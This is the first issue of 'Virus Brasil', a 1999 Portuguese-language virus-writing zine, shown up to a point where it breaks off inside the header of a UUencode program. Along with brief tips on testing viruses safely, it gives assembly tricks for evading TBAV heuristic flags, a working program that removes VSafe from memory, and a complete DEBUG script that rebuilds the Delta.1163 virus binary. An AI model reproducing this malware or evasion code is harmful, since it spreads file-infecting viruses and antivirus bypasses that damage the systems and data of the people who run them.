ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛ
Û             /  __           ___             __   __   __   ___ .           Û
Û      |  /  |  |__)  |   |  (__             | _) |__) |__| (__  | |         Û
Û      |/    |  |  \  |___|  ___)            |__) |  \ |  | ___) | |___      Û
Û                                                                            Û
ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß



                            VIRUS BRASIL N§01
                       Janeiro/Fevereiro/Marco 1999
        Cidade Patriarca - Zona Leste - Sao Paulo - SP - Brasil




        Seja bem vindo ao primeiro numero de um zine totalmente voltado 
  para a confeccao de virus . Bem vindo `a Virus Brasil numero 1 , 
  aproveite .






                      ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                            Antes de mais nada 
                      ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

        Como se pode ver, antes de mais nada quero falar a voce o que e' 
        essencial para voce manipular as informacoes aqui contidas e obter
        seu melhor resultado . Quero lembrar tambem que todo o conteudo do
        zine pode ser copiado e modificado sem previa autorizacao do autor 
        afinal aqui tudo e' ripado mesmo , vai ficar um pouco feio nao falar 
        de onde veio o texto ou falar que e' seu mas ta valendo ...


        Material :
        ÄÄÄÄÄÄÄÄÄÄ

        - Um computador para testes (ate seu pentium II serve)
        - Algums boms anti-virus ((AVP , F-PROT , TBAV) ja ta bom esses 3 )
        - Compilador de Assembly ( Turbo Assembler 3 , Macro Assembler v.(?) )
        - Um debugger (serve o do DOS mesmo)
        - Um Norton Guides tambem ajuda bastante (para ASM e' claro)
        - Um conversor de arquivos EXE para COM ( serve o EXE2BIN )
        - Descompilador de ASM para auxilia-lo em seu aprendizado (ai tambem
        precisa do ICEUNP ou outro desencriptador qualquer ,para desencriptar 
        os virus , e ler suas fontes sem maiores problemas)

        Conhecimento :
        ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

        - Assembly ( ter um dia ,pelo menos , feito um programa para limpar 
        a tela do micro !!! )
        - Debugadores

        Bom se voce tiver o material e o conhecimento e tiver a curiosidade 
        de aprender esta no caminho certo , espero que goste da leitura ,
        duvidas , sugestoes , reclamacoes , e o caraio a 4 manda um e-mail
        para mim em : 
                
                nim_bus@hotmail.com
                                                                     Valeu...

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ    
              ___   ___         ___   ___          __    ___
             |     |   |  |\ |   |   |__   |   |  |  \  |   |
             |___  |___|  | \|   |   |___  |___|  |__/  |___|

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  

Conteudo:
ÄÄÄÄÄÄÄÄÄÄ

        1 - Editorial .
        2 - Aprenda a testar virus com seguranca !
        3 - Despiste os Anti-Virus voce tambem !
        4 - Del(ta).1163 (Script File) . 
        5 - UUencode e UUdecode .
        6 - Goma.743 (codigo-fonte) .
        7 - BRASIL boot virus (uuencodado) .
        8 - Goma_COM (codigo-fonte) -----> 100 % Desconhecido.
        9 - Goma_COM (Script File) .
       10 - Valeu ...


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  
                 ___   __   .  ___   ___    __   .   __
                |__   |  \  |   |   |   |  |__)  |  |__|  |
                |___  |__/  |   |   |___|  |  \  |  |  |  |___
                
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  1. Editorial
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

        Pera ai . Antes de mais nada reflita no porque de voce ter pego este
  zine . Pensou ? Bom , se foi por curiosidade , legal , continue lendo , se
  foi so mais um download , tambem ta valendo , mas se voce esta querendo 
  aprender como fazer um virus ou aprender C , Assembly ou Pascal , foi mal
  irmao , mas voce esta lendo o zine errado .
        Bom , vamos logo ao que interessa , eu sempre tive a vontade de cri-
  ar um grupo de virii makers aqui em sampa ; mas os cara que manja sao tudo 
  loco e nao curtem muito trabalhar em grupo , que se foda , vou sozinho e 
  vou ver ate quando eu consigo manter essa fita , ta saindo esse numero , 
  quero dizer , esse zine sem previsao de periodicidade dos numeros ,tendo
  em vista que nao tenho materias estocadas e nem viruses .
        A Literatura nacional de virus e' muito escassa , e o que se encon-
  tra sao traducoes de textos em ingles ou algum em alemao , eu nao tenho o
  intuito de me tornar bosta nenhuma , nao manjo horrores de Assembly ou C ,
  mas o que aprendi , creio que da pro gasto .
        Bom deixa eu me apresentar , eu sou o nim bus , prazer em conhece-lo.
  Se voce nao me conhecia ficou conhecendo agora . Nesse numero ninguem me 
  ajudou em porra nenhuma se tiver ao longo do zine alguma materia ou virus 
  de alguem eu dou um toque falando de quem e' e onde saiu.
        Tipo por ser o primeiro editorial e do primeiro zine , nao faco ide-
  ia se esta ficando muito extenso , sei la se a leitura esta cansativa ,va
  tomar um Guarana "Antartica" e volta na sequencia , esse zine tem por ob-
  jetivo aumentar o contato entre os virii makers , para a correspondencia 
  de fontes , ideias , rotinas e o caraio a 4 e tambem prezo o cara que es-
  ta comecando , creio que nossa leitura ira lhe ajudar bastante .( Mas se
  voce esta comecando e nao manja nada de Assembly , acho melhor pegar um
  curso por ai ou voce vai viajar muito )
        Bom ta valendo , acho que o que tinha pra falar ai no comecinho ja
  falei agora e' mandar bronca nas materias , parar de papo furado e pau no
  cu (ai ,ta sem acento ,nao so porque estou digitando sem acento ,mas cu 
  nao tem acento pois nao se acentua oxitona terminada em u , so' em (a,e,o))
  ah , podes crer , pau no cu dos americanos e vamos mandar ver , somos bra-
  sileiros e nosso pais se escreve com "S" . 
        BRASIL ...
  

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  
                            __   ___   ___ / __   .   __
                     |\/|  |__|   |   |__   |__)  |  |__|
                     |  |  |  |   |   |___  |  \  |  |  |
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  



  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2 - Aprenda a testar virus com seguranca !
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


Txt de 40Hex  Volume 1 Issue 2  0002

                 A MANEIRA SEGURA DE "BRINCAR" COM VIRUS

   O problema de "brincar" com virus e' que voce nunca sabe o dano que
   ele pode causar no seu HD . Existem uma porrada de virus que quando
   rodam , automaticamente fodem a FAT em todos os discos do sistema .
   Bem , tem uma maneira de ficar longe e "salvo" desses programas , e
   voce podera testa-los sem qualquer grilo , como um virus de verdade.

   A chave para isso e' um programa do DOS chamado SUBST que muda o 
   controle de drives e diretorios a seu criterio .

   Faca esse arquivo batch abaixo e o copie e execute no drive A
   (disquete)

 -------------------------------------------------------------------------
                              @echo off
                              subst d: a:\
                              subst c: a:\
 --------------------------------------------------------------------------

    O que isso faz e' mandar qualquer acesso (tentativa) aos discos C: e
    D: (duas HD's no caso do cara que escreveu) para o drive A:  .Entao 
    o unico dano que podera ocorrer sera no disquete do drive A: .

    Nenhum programa pode acessar seu HD quando utilizado esse commando .
    O cara que escreveu diz que usa o tempo todo e e' 100 % seguro .
    { *** Seila bicho nao confie muito nisso nao ja testei e quase me dei 
    mal , maiores esclarecimentos vide o help do proprio DOS)

    Tem mais , se voce nao quer ficar destroindo um disquete sempre que
    for testar ("brincar") com um virus , voce pode fazer o mesmo proce-
    dimento para um disco de RAM (RAMdisk)

    Divirta-se ...

                                                          por HellRaiser

{*** 

        Para lhe assegurar uma maior garantia contra danos acidentais , 
procure utilizar , o Vsafe juntamente com o TBmem quando voce for testar
virus que voce desconhece o potencial destrutivo , e lembre-se sempre de
deixar ativado a protecao contra gravacao no boot do SETUP de seu computa-
dor . 
        O Vsafe embora seja facilmente desalocado da memoria por muitos 
virus , quando carregado algum outro TSR apos ele , ele nao se desaloca
tao facilmente , mesmo sendo um programa chato que bipa toda hora e' mui-
to util para a sua seguranca.
        O TBmem e' o guardiao do tbav , ele captura a int21 e acompanha a
execucao de todo arquivo , e avisa quando um programa tenta inserir um
codigo em outro (um virus no nosso caso) , ou tenta capturar alguma in-
terrupcao .
        Ja a protecao contra gravacao no boot que se encontra no setup de
seu computador e' muito util e avisa se um programa tenta escrever algo
no setor de boot de sua HD.
        Embora mesmo com todas essas precaucoes , erros podem ainda ocor-
rer, entao fique esperto , tente obter os fontes antes de testar , para 
saber o que o virus faz e tudo mais ; bom acho que e'isso  .

                                                                     *** }

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  
                            __   ___   ___ / __   .   __
                     |\/|  |__|   |   |__   |__)  |  |__|
                     |  |  |  |   |   |___  |  \  |  |  |
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  



  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3 - Despiste os Anti-Virus voce tambem !
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

       Me dei o direito de citar as fontes e alterar algumas partes da 
  materia , mas seu conteudo continua com poucas mudancas.

TXT retirado do zine quebra de sigilo .
   ---------------------------------------------------------------------
    -=[ Edicao No.00 -=#=- Marco/97 -=#=- By [RiCk> CraZy & Alevirus ]=-
   ---------------------------------------------------------------------
-=[+]================================================================[+]=-
Materia de Alevirus


                   -=[+]=-  4. Autopsia dos Virus  -=[+]=-
                           =======================

Bem, esta materia e para aqueles enteressados em producao de virus. 
Nao tenho o intuito de ensinar ASM, PASCAL ou mesmo C++ para ninguem.
O que pretendo aqui e'destribuir informacoes e colocar a disposicao de
pessoas interessadas em Virii como Tecnicas de programacao e propagacao.
Nesta edicao ponho tambem a inteira disposicao o fonte de um virus Nacional
que fez muito sucesso no ano de 1996 com o nome de Delta.
Alem de mais algumas rotinas de como evitar flags do Heuristic do TBAV.

   Bem no proximo bloco veremos os flags do TBAV que foram cedidos pela
   Revista VLAD.


                       
                       SE DEFENDA DOS FLAGS DO TBSCAN   
                      
       

       F. Suspicions file access; this file might be able to infect a file
       Para esse flag proceda assim!
                 
                 Essa rotinas sao muito comuns em Virus!
                 
                 mov      ax,5701h           ; Proporciona Flag! 'F'
                 int      21h


                 mov      ax,5700h           ; Nao proporciona Flag! o.k
                 inc      al
                 int      21h                

                 mov      ax,4301h           ; Proporciona Flag! 'F'
                 int      21h

                 mov      ax,4300h           ; Nao proporcina Flag! o.k
                 inc      al
                 int      21h

{ ***
        Existem outros enderecos que tambem proporcionam flag F no tbav .
Tente descobrir quais os sao , pela compilacao de alguns trechos do pro-
grama , ate achar onde o tbav acha a flag , ai e' so'criar uma rotina com
o endereco e chama-la , veja o exemplo :

 * Supondo esse trecho de programa , encontramos a flag no indicado , esse
 e'um endereco real e a flag tambem.

                mov     ah,40h                   ; Proporciona Flag! 'F'
                mov     cx,3                     ; Proporciona Flag! 'F'
                lea     dx,[bp + read_buffer]    ;
                int     21h                      ;

  * Veja como fazer o TBAV passar direto . 
  
                call    flag_f_2                 ; chamando a rotina
                lea     dx,[bp + read_buffer]    ;
                int     21h                      ;

                ;;; Programa ;;; 
  ; Insira a rotina onde for mais conveniente de preferencia (near)
  ; Temos entao 4 bytes adicionais ao virus ,mas sem uma flag
  ; 3 bytes da chamada da rotina e mais um do retorno

flag_f_2:                                        ; rotina despistadora
                mov     cx,3                     ; Nao proporcina Flag! o.k
                mov     ah,40h                   ; Nao proporcina Flag! o.k
                ret                              ; retorne      

        *** }

       E. Flexible Entry Point; this file is designed to able to be linked
          anywhere. Very common for viruses.

                 
                 call    $+3                 ; Proporciona Flag! 'E'
                 pop     bp

                 
                 call    $+3                 ; Nao proporciona Flag! o.k
                 int     3
                 pop     bp   ---------------> restore BP          
                 
                              ou entao se encontrar assim

                 call    $+3
                 pop     bp                  ; Outra situacao!! 
                 sub     bp,offset $ - 1     ; Proporciona Flag! 'F' e 'B'


                 call    $ + 3             
                 pop     bp                  ;Nao proporciona Flag! o.k
                 sub     bp,offset $ - 1
                 int     3


       B. Back to entry point; this file is designed to be able to be linked
       anywhere in a file. Very common for viruses.

                 
                 
                 mov     ax,100h             ;Proporciona Flag! 'B'
                 jmp     ax


                 mov     ax,200h             ;Yeap faca a conta HEHE
                 shr     ax,1                ;Nao proporciona Flag! o.k
                 jmp     ax


       S. Contain a routine to search for executables (.COM or .EXE) files.


{ ***                  lea       dx, [bp + comspec]    *** }

       comspec         db        '*.COM',0   ;Proporciona Flag! 'S'          
       

       comspec         db        ').COM',0   ;Nao proporciona Flag! o.k

                       inc       byte ptr [bp + offset comspec]
                       lea       dx, [bp + comspec]  
                       int       21h
                       dec       byte ptr [bp + offset comspec]
       
       Obs. Se for mexer em algum fonte que voce possua para alterar essa 
       procure primeiro pela rotina pronta no corpo do virus o.k e altere 
       para isto.

{ ***  Vamos ver se voce entendeu o porque das coisas ai em cima , bom
tinhamos a mascara do com como *.COM que da flag S , entao colocamos como
mascara o ).COM , mas nosso virus nao procurara ).COM ele ira procurar 
*.COM , pois o ")" e' um char antes do "*" , e em 
'inc       byte ptr [bp + offset comspec]' pegamos o ")" e somamos 1 temos 
entao o "*" temos entao *.COM . Em 'dec       byte ptr [bp + offset comspec]' 
*.COM volta a ser ).COM . 
        Vide o GOMA_COM ainda nesses zine para melhores entendimentos dessa
no flag , to com preguica , calcula ai os bytes a mais ***}


       Z. EXE/COM determinations. Contains code that seems to have no pur
       pose other


        
        cmp       word ptr [bp + buffer], 'ZM' ;Proporcina Flag! 'Z'
                       
        cmp       word ptr [bp + buffer], 'MZ' ;Proporcina Flag! 'Z'
                       
        cmp       word ptr [bp + buffer], 'Z'  ;Nao proporcina Flag! o.k
           
        cmp       word ptr [bp + buffer], 'M'  ;Nao proporcina Flag! o.k

{ *** Aqui nosso colega Alexandre comete um equivoco , pois se encriptarmos
o virus e formos procurar "word" -> 'M' ou 'Z' dara zica , ira infectar como
COM mesmo e que se foda , entao se seu virus for encriptado , utilize byte 
ao inves de word .

        cmp       byte ptr [bp + buffer], 'M'  ;Nao proporcina Flag! o.k

                        ou

        cmp       byte ptr [bp + buffer], 'Z'  ;Nao proporcina Flag! o.k

        
        Nao da flag nem buga seu virus.   *** }



        G. Garbage instructions. Contains code that seems to have no purpose
        other than encryption recognition by virus disappeared.

        User o compilador em vez de tasm virus /m use tasm virus /m2 
        ou o A86.

{ ***                         
                                Flag U  

        U.  Undocumented interrupt/DOS call.  The program might be just 
   tricky but can also be a virus using a non-standard way to detect itself.
   
        Bao aqui e' uma viagem do anti virus mesmo mas veja um programa e
   onde se encontra a flag. Voce tambem pode utilizar esse programa sem a
   parte que retira o vsafe da memoria como isca para virus.

;;;;;;;;;;;;;;;;;;;;; Vsafe/Vwatch Remover ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.model tiny                   ; Modelo de memoria
.code                         ; Inicio do codigo
        org 100h              ; .COM 

inicio  proc    near
        
        mov     ax,0fa01h     ; Proporcina Flag! 'U'
        mov     dx,5945h      ; Proporcina Flag! 'U'
        int     21h           ; Remover Vsafe / Proporcina Flag! 'Z'
                              ;
        mov     dx,offset msg ; Escrever a msg
        mov     ah,09h        ;
        int     21h           ;

        mov     ah,4ch        ; Fechar o programa
        int     21h           ;

inicio  endp

;; Tipo aqui se insere o despistador de flag ;;

msg     db      'Vsafe Desinstalado com sucesso$'

end     inicio
;;;;;;;;;;;;;;;;;;;;; Vsafe/Vwatch Remover ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
        
        Para se livrar dessa flag proceda assim :

        mov     ax,0fa01h     ; 
        mov     dx,5945h      ; 
        call    int21h        ; Remover Vsafe / Nao Proporcina Flag! 

        ;; Programa ;;


int21h:                       ;  despistador de flag 

        int     21h           ;
        ret                   ;


        Bom , acho que e' so' isso para essa flag . 



                         Flag O
        

        O.  Found code that can be used to overwrite/move a program 
        in memory.

                Veja assim da bosta :

              lea     si,[bp + host]   ; 
              mov     di,100h          ; 
              push    di               ; 
              movsw                    ; Flag ! -> 'O'
              movsb                    ; Flag ! -> 'O'

         Faca o seguinte , chame uma rotina que faca os movs.

              lea     si,[bp + host]   ; 
              mov     di,100h          ; 
              push    di               ; 
              call    move_string      

              ;;; programa ;;;


move_string:

              movsw                    ; No Flags !
              movsb                    ; No Flags !
              ret                      ;

                          
                          Flag t

      
      t.  Program contains a time or date triggered event.


      Assim tem flag :

                mov     ah,2ah          ; Flag -> 't'
                int     21h

      Assim nao tem :

                mov     ah,2ah          ; No Flags
                call    int21

                ;; programa ;;

int21h:                       ;  despistador de flag 
        int     21h           ;  agora flag 't'
        ret                   ;


        Bom, quanto a int 1ah , ai nao tem jeito so fazendo um vetor , que
por enquanto esta longe dos objetivos desse zine , ensinar como criar vetores
em ASM ainda nao ...

        Bom terminam-se aqui os NO-FLAGS do alevirus e minhas insercoes e
segue anexo a fonte do virus delta que ja estavam na materia original e optei
por deixa-la ai.           
                                                                        *** }

   Como puderam ver acima os No flags funcionan e foram testados. 


   Agora ai vai o fonte do DELTA, obrigado ao autor James Uema.

   { *** Quem necessitar dos fontes , favor procurar o zine Quebra de
   Sigilo ou mandar um e-mail para mim , ao inves do fontes distribuo
   um script para debug do mesmo . *** }

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                      ___   ___   __   .   __   ___
                     (__   |     |__)  |  |__)   |
                     ___)  |___  |  \  |  |      |
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4 - Del(ta).1163 (Script File) . 
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  Para maiores esclarecimentos sobre como se utilizar do script abaixo ,
  favor ler "9 - Goma_COM (Script File)" no zine .

;;;;;;;;;;;;;;; DELTA_1163.SCR ;;;;;;;;;;;;;;;;;;;;;;;
N DELTA.COM
E 0100 E9 01 00 21 06 E8 01 00 7E 5D 83 ED 04 0E 1F 0E 
E 0110 07 BE 23 00 03 F5 8B FE B9 80 04 3E 8A 66 04 FC 
E 0120 AC 32 C4 AA E2 FA 90 79 C6 7A 81 B3 5F FE 82 3B 
E 0130 0B 48 F5 8B FF B8 58 7F FE 42 7F 0A 69 FF BB FF 
E 0140 7A F5 8B C1 FF 7A C7 74 7E 82 8D DA 78 61 78 C6 
E 0150 98 7E 2E B5 82 C0 5D 7F F5 80 7D 8B C7 7D 7E 8D 
E 0160 DA 70 78 C6 B1 7E 2E B5 70 CA 2C B3 5F 58 F0 21 
E 0170 80 C7 E7 7E FE 40 7E 7E 24 0A 75 F2 A6 87 6D 78 
E 0180 7D 7E F0 A6 95 90 DF 7D 7E 55 BF DD 7D 7E F2 A5 
E 0190 87 6D BD 3E 3E 2E CA 1C B3 5F 2D 61 57 70 7C 7E 
E 01A0 82 F5 8B 4D 81 C7 F5 7A 79 70 61 8D DA 78 C6 D1 
E 01B0 7E 2E B5 70 61 C6 5F 4B B3 5F F7 60 91 7F F2 78 
E 01C0 8F 7F CA 5B C4 BB 7F B3 5F FE 40 58 7F 7F 0A 7D 
E 01D0 26 95 69 61 50 DF 5D 7F 50 F4 60 5B 7F C0 7E 7F 
E 01E0 F7 7A F6 22 7C 60 79 60 28 B5 68 26 7D 78 F7 7A 
E 01F0 DD 61 7F DF F9 7A DD 63 7F 68 26 FD 96 6E F0 BE 
E 0200 F0 A6 68 26 50 7D 78 FF 7A 84 F0 AE 50 F5 58 FD 
E 0210 7A 85 4D BE 4D A5 4D B7 4D AC 4D 88 4D 81 4D 93 
E 0220 94 AF 2C 12 5F 5E 7E CA 32 B3 7F 73 74 77 39 11 
E 0230 11 1A 5E 1C 07 0A 1B 0D 5E 18 0C 11 13 5E 56 3A 
E 0240 3B 32 57 0A 1F 5E 28 17 0C 0B 0D 5E 5F 5F 5F 73 
E 0250 74 74 77 77 2C 1B 0D 1B 0A 5E 17 10 5E 4D 4E 5E 
E 0260 0D 1B 1D 11 10 1A 0D 5E 5F 73 74 5A 3C 0C 1F 04 
E 0270 17 12 5E 53 5E 4E 4C 51 47 48 E3 E2 50 81 60 91 
E 0280 7F E2 2E 2D 78 42 81 0A 47 CA 1C B3 5F 2D 79 58 
E 0290 DF 68 7E 45 BD 0B 55 CA 51 E2 50 81 60 91 7F 58 
E 02A0 F5 39 5E 2E 5B 7E FE 43 7E FE 26 0B 6B 53 7E B6 
E 02B0 58 F7 39 5E 58 FF 01 5A F5 7A 0C 78 58 FF 11 5A 
E 02C0 F5 7A 79 25 26 E3 B4 7C 7E E2 43 7A 81 0B 78 CA 
E 02D0 3B 70 79 E3 B1 FE 82 6F 0A DE FE 82 6C 0A E5 FE 
E 02E0 82 43 0A 74 43 7E 12 0A 70 43 7E 35 0B 7D 96 71 
E 02F0 7E E3 94 EE 7C 0E 79 2C F5 A8 96 7D 7E 24 95 8F 
E 0300 2E 2D 2F 2C 28 60 2B E2 96 A6 7E 0C 7D 97 B4 7E 
E 0310 2C CA 7A B3 64 FF 84 7A 6F 0B 3B CE 6E 98 0E 9A 
E 0320 0F 7A 5E 5A 4D F4 9E CE 6E 98 0E F4 BA 98 0F CE 
E 0330 6C 98 0E CE 7E 98 0F 70 61 CA 77 C4 59 7F B3 5F 
E 0340 C4 62 7C C6 3E 7E F0 A6 F5 60 12 7E 45 60 12 7E 
E 0350 0A 84 DF 12 7E 55 BD 45 BC 02 89 94 7E 7E 81 81 
E 0360 24 FD 83 7F 0A 72 E3 23 61 20 24 27 25 26 96 AC 
E 0370 7E BD 96 8D 7F 2C 60 C6 7C 43 E2 50 81 60 91 7F 
E 0380 0D 7A 61 24 95 2A F5 A6 70 61 B8 78 58 7F 7F CA 
E 0390 41 C7 7D 7E C4 5D 7F B3 5F 0C 48 96 E5 7F 0C 4F 
E 03A0 CE 7C 96 F5 7F 2E 96 31 7F C7 F5 7A C4 DD 7A CA 
E 03B0 3E B3 5F 4C BE 96 06 7F 26 FD 96 7D C0 F5 7A B8 
E 03C0 7A 97 F7 3A 7F F5 A8 CA 3E C7 7D 7E B3 5F 96 FB 
E 03D0 7F CA 40 B3 5F 61 24 96 DE 7F E3 23 61 20 24 27 
E 03E0 25 26 BD 2E 2D 2F 29 78 2C 21 60 79 82 C7 81 7E 
E 03F0 4C BE 8C D0 58 F5 3B 82 58 F4 23 80 43 3B 26 0A 
E 0400 68 43 1B 06 0A 5E 43 3D 31 0A 5C 43 1D 11 0A 52 
E 0410 79 21 27 25 26 86 BD FE 85 3B 0B 8A 79 21 27 25 
E 0420 26 C3 7C 7E 87 BD FE 85 1B 0B 9B 95 91 FE 85 33 
E 0430 0B A0 79 21 27 25 26 87 C3 7F 7E BD FE 85 13 0B 
E 0440 B1 95 91 2E 2D 2F 2C 60 96 63 7F 2C 60 C6 7C 43 
E 0450 E2 50 81 60 91 7F 0D 7B 61 24 97 EB 7E F5 A6 CA 
E 0460 41 C4 F5 7A 70 61 C7 66 7E B3 5F B8 78 58 7F 7C 
E 0470 CE 7C 96 C5 7E 43 0A 85 09 7A 75 AC 0A 7C 95 17 
E 0480 F5 68 ED 7A CF 7A AD 9C 2C 2E 96 D2 7E 0D 7A 26 
E 0490 24 95 95 96 1C 7E CA 3E C7 FF 7A C4 DD 7A B3 5F 
E 04A0 CA 3E C7 74 7E C4 42 77 B3 5F 26 2E 7B F5 7A 4D 
E 04B0 AC C7 7E 7C 89 8F 3E DD F1 7A F7 68 F3 7A B9 78 
E 04C0 E7 7A 7E 7E B9 78 E5 7A 81 81 B9 78 DF 7A 7E 7E 
E 04D0 26 24 55 BC DD E1 7A 4C BE 96 2A 7E CA 3E C7 66 
E 04E0 7E C4 F5 7A B3 5F 96 13 7E CA 40 B3 5F 61 24 96 
E 04F0 F6 7E 61 24 27 25 26 BD 28 29 60 78 70 61 70 79 
E 0500 60 4D BE F0 A6 F4 58 12 7A 74 9A 0A 86 61 F6 58 
E 0510 7A 7E 4D 88 C1 DD 7A C7 DD 7A 82 8D DA C0 B8 7A 
E 0520 F5 80 C7 FE 7A D2 4C BA D4 9C 84 79 61 21 20 BD 
E 0530 CA 3C 4D B7 4D AC B3 5F BD C6 7E 29 B3 5F 0C 6A 
E 0540 F7 68 61 7F F7 70 63 7F FF 9C 7E FE FF 84 7E FE 
E 0550 0A 7C 86 BD 87 BD F5 68 61 7F F5 70 63 7F FF BC 
E 0560 7E B6 C6 7F 29 B3 5F BD C6 7E 3D B3 5F 50 F7 70 
E 0570 5F 7F C6 7F 3D 4D B7 B3 5F BD C6 7F 3D 50 F5 70 
E 0580 5F 7F B3 5F BD B5 7C 7E 4E 78 50 66 73 7E 7E 
RCX
048F
W
Q
;;;;;;;;;;;;;;; DELTA_1163.SCR ;;;;;;;;;;;;;;;;;;;;;;;

        Fim do script do virus Delta.1163 ...


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                               ___  .     
                        |   |   |   |  |    
                        |___|   |   |  |___ 
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   5 - UUencode e UUdecode 
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


        Bom galera to mandando junto com o zine os fontes do UUencode e do
  UUdecode , pois vou anexar ao zine o virus de boot "BRASIL" e ele ta 
  UUencodado , a utilizacao dos programas e' muito simple o UUencode encripta
  o arquivo , e o UUdecode desencripta o arquivo . Esses programas sao muito
  uteis pois deixam que coloquemos arquivos dentro de textos , como aqui no
  nosso caso .
        Compile com o Tasm 3 e so' alegria ...


                           UUencode

;----------------------------------------------------------------------------
; UUENCODE program, version 1.1
;
; Copyright 1995, David S. Peterson
;
; This program may be used and distributed freely as long as this copyright
; notice is not removed.  Feel free to use sections of code from this program
; as part of your own programs, but please leave this file intact.  I am
; reasonably certain that this program doesn't have any major bugs, but its
; use is at your own risk.  If you find any bugs in this program, or have any
; questions or comments, please feel free to send me some email or write me a
; letter.  My email address is:
;
;    dspeter1@eos.ncsu.edu
;
; and my mailing address is:
;
;    David S. Peterson
;    3717 Williamsborough Ct.
;    Raleigh, NC 27609
;    USA
;
; If you like this program, feel free to send me a postcard from your home
; town.
